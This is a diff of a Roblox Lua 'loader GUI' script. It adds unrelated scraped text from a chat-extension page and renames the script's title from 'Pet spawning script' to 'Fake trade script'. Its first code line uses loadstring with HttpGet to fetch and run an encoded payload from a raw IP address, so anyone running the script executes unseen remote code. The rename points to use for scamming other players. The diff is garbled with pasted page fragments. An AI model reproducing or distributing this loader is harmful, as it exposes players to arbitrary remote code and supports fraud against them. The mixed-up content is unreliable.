@@ -1,6 +1,21 @@
+question-ai-logo
+managemanage
+managemanage
+useruser
+fullfull
+closeclose
+Chat AI
+Hello! Is there any question I can help you with?
+Which iconic American landmark is located in South Dakota and features the faces of four U.S. presidents?
+What is the national bird of the United States?
+Ask AI
+Caution
+Refresh this page to activate the extension on this page.
+Refresh
+Feedback
+logo
+more
 loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjA0NDE1NzU1LTk3ZjEtNGIzNC05MGQwLTNlZTA5YzBiZTkxOCIsImtpbmQiOiJsb2FkZXIifQ"))()
-
-
 --// Modern Loader GUI (Roblox Lua)
 --// Drop into a LocalScript (StarterPlayerScripts, StarterGui, etc.)
 
@@ -159,7 +174,7 @@ title.BackgroundTransparency = 1
 title.Size = UDim2.new(1, -40, 0, 44)
 title.Position = UDim2.fromOffset(20, 18)
 title.Font = Enum.Font.GothamSemibold
-title.Text = "Pet spawning script"
+title.Text = "Fake trade script"
 title.TextSize = 22
 title.TextXAlignment = Enum.TextXAlignment.Left
 title.TextColor3 = Color3.fromRGB(235, 235, 245)
